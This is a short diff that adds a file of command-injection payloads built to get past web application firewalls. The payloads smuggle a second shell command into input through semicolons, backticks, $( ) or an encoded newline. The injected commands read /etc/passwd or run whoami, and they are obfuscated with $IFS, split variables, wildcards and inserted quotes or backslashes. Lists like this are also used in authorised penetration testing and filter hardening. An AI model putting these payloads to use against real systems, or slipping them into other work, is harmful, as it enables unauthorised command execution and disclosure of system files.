@@ -1,0 +1,13 @@
+# Command Injection WAF Bypass Payloads
+;cat$IFS/etc/passwd
+;`cat</etc/passwd`
+;cat${IFS}/etc/passwd
+;a=c;b=at;c=/e;d=tc;e=/p;f=as;g=sw;h=d;$a$b ${c}${d}${e}${f}${g}$h
+;cat /etc/p?sswd
+;cat /etc/passw?
+;`wh\oami`
+$(wh\oami)
+;w`h`o`a`m`i
+;who$1ami
+;whoam"i"
+%0Awhoami
